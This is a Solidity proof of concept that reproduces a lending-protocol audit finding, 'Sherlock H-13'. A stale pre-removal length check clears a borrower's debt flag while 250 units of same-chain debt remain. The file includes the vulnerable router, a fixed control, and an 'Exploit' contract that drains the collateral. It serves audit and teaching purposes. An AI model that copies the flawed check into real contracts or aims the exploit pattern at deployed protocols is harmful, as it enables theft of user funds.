// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  LEND — _updateRepaymentState drops the borrowed-asset flag (Sherlock H-13)
    SYNTHETIC, cheatcode-free reduction of the audited function.
    userCrossChainCollaterals is a memory snapshot. Its length is the
    pre-removal count. One cross-chain record makes length == 1, so a full
    repay removes the lToken from userBorrowedAssets. Same-chain principal
    of 250 is still owed. The collateral check walks userBorrowedAssets,
    sees no debt, and releases 250. The fair books still show 250 of debt
    and release nothing. The control keeps the flag while same-chain debt
    remains. */

contract Usd {
    string public constant symbol = "USD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LendBook {
    struct Borrow {
        uint256 srcEid;
        uint256 destEid;
        uint256 principle;
        address borrowedlToken;
        address srcToken;
    }

    Usd public usd;
    mapping(address => mapping(address => Borrow[])) internal collaterals;
    mapping(address => uint256) public sameChainDebt;
    mapping(address => bool) public borrowedAssetListed;
    mapping(address => uint256) public collateral;

    constructor(Usd token) {
        usd = token;
    }

    function addCollateral(
        address borrower,
        address underlying,
        Borrow memory row,
        uint256 sameChain,
        uint256 collateralAmount
    ) external {
        collaterals[borrower][underlying].push(row);
        sameChainDebt[borrower] = sameChain;
        borrowedAssetListed[borrower] = true;
        collateral[borrower] = collateralAmount;
        usd.mint(address(this), collateralAmount);
    }

    function getCrossChainCollaterals(address borrower, address underlying) external view returns (Borrow[] memory) {
        return collaterals[borrower][underlying];
    }

    function removeCrossChainCollateral(address borrower, address underlying, uint256 index) external {
        Borrow[] storage rows = collaterals[borrower][underlying];
        rows[index] = rows[rows.length - 1];
        rows.pop();
    }

    function removeUserBorrowedAsset(address borrower) external {
        borrowedAssetListed[borrower] = false;
    }

    function collateralOf(address borrower) external view returns (uint256) {
        return collateral[borrower];
    }

    function releaseIfUnlisted(address borrower, address to) external returns (uint256 released) {
        if (!borrowedAssetListed[borrower]) {
            released = collateral[borrower];
            collateral[borrower] = 0;
            usd.transfer(to, released);
        }
    }
}

contract CrossChainRouter {
    LendBook public book;
    uint256 public trackedDebt;
    uint256 public fairDebt;

    constructor(LendBook _book) {
        book = _book;
    }

    function updateRepaymentState(
        address borrower,
        address token,
        uint256 repayAmountFinal,
        uint256 borrowedAmount,
        uint256 index
    ) external {
        LendBook.Borrow[] memory userCrossChainCollaterals = book.getCrossChainCollaterals(borrower, token);
        if (repayAmountFinal == borrowedAmount) {
            book.removeCrossChainCollateral(borrower, token, index);
            // @> VULN: length == 1 is the pre-removal snapshot, so the borrowed asset is cleared while same-chain debt remains
            if (userCrossChainCollaterals.length == 1) {
                book.removeUserBorrowedAsset(borrower);
            }
        }
        trackedDebt = book.borrowedAssetListed(borrower) ? book.sameChainDebt(borrower) : 0;
        fairDebt = book.sameChainDebt(borrower);
    }
}

contract FixedRouter {
    LendBook public book;
    uint256 public trackedDebt;

    constructor(LendBook _book) {
        book = _book;
    }

    function updateRepaymentState(
        address borrower,
        address token,
        uint256 repayAmountFinal,
        uint256 borrowedAmount,
        uint256 index
    ) external {
        LendBook.Borrow[] memory userCrossChainCollaterals = book.getCrossChainCollaterals(borrower, token);
        if (repayAmountFinal == borrowedAmount) {
            bool onlyCrossChain = userCrossChainCollaterals.length == 1 && book.sameChainDebt(borrower) == 0;
            book.removeCrossChainCollateral(borrower, token, index);
            if (onlyCrossChain) {
                book.removeUserBorrowedAsset(borrower);
            }
        }
        trackedDebt = book.borrowedAssetListed(borrower) ? book.sameChainDebt(borrower) : 0;
    }
}

contract Exploit {
    Usd public usd;
    LendBook public book;
    LendBook public controlBook;
    CrossChainRouter public router;
    FixedRouter public fixedRouter;
    address public borrower;
    address public underlying;

    uint256 public constant CROSS = 100e18;
    uint256 public constant SAME = 250e18;

    constructor() {
        usd = new Usd();
        book = new LendBook(usd);
        controlBook = new LendBook(usd);
        router = new CrossChainRouter(book);
        fixedRouter = new FixedRouter(controlBook);
        borrower = address(0xB0B0);
        underlying = address(0xA55E7);
    }

    function run() external {
        LendBook.Borrow memory row = LendBook.Borrow({
            srcEid: 1,
            destEid: 2,
            principle: CROSS,
            borrowedlToken: address(0x1701),
            srcToken: underlying
        });
        book.addCollateral(borrower, underlying, row, SAME, SAME);
        controlBook.addCollateral(borrower, underlying, row, SAME, SAME);
        uint256 rowsBefore = book.getCrossChainCollaterals(borrower, underlying).length;
        router.updateRepaymentState(borrower, underlying, CROSS, CROSS, 0);
        uint256 tracked = router.trackedDebt();
        uint256 fair = router.fairDebt();
        uint256 released = book.releaseIfUnlisted(borrower, msg.sender);
        fixedRouter.updateRepaymentState(borrower, underlying, CROSS, CROSS, 0);
        uint256 controlReleased = controlBook.releaseIfUnlisted(borrower, msg.sender);
        require(rowsBefore == 1, "one cross-chain row");
        require(book.sameChainDebt(borrower) == SAME, "same-chain remains");
        require(tracked == 0, "books say zero");
        require(fair == SAME, "fair debt 250");
        require(fair - tracked == SAME, "off by 250");
        require(released == SAME, "250 collateral released");
        require(usd.balanceOf(msg.sender) == SAME, "borrower received 250");
        require(fixedRouter.trackedDebt() == SAME, "control still tracks 250");
        require(controlReleased == 0, "control releases nothing");
        require(controlBook.collateralOf(borrower) == SAME, "control collateral stays");
    }
}
